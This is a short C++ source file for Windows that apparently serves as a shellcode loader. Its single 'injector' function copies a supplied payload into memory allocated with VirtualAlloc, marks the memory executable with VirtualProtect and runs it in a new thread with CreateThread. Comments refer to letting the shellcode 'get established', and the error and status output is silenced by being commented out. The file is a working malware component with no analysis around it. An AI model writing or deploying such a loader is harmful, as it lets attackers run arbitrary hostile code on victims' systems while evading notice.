#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <iostream>

int injector(std::vector<uint8_t> payload) {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;

    auto payload_len = payload.size();

    exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (exec_mem == nullptr) {
        //std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        return 1;
    }

    RtlMoveMemory(exec_mem, payload.data(), payload_len);

    rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
    if (rv == 0) {
        //std::cerr << "VirtualProtect failed: " << GetLastError() << std::endl;
        return 1;
    }

    th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
    if (th == nullptr) {
        //std::cerr << "CreateThread failed: " << GetLastError() << std::endl;
        return 1;
    }

    //Waiting for 1 second to let the shellcode run and get established (and create the pipe), and then start reading from pipe stuff.
    ////std::cout << "[!] Waiting one second to let ShellCode do its thing" << std::endl;
    WaitForSingleObject(th, 1000);

    DWORD exitCode;
    GetExitCodeThread(th, &exitCode);
    //std::cout << "[+] Shellcode thread exit code: " << exitCode << std::endl;

    CloseHandle(th);

    return 0;
}

